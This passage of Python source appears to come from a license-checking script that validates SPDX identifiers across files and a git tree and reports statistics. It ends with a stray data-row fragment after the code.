    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",1
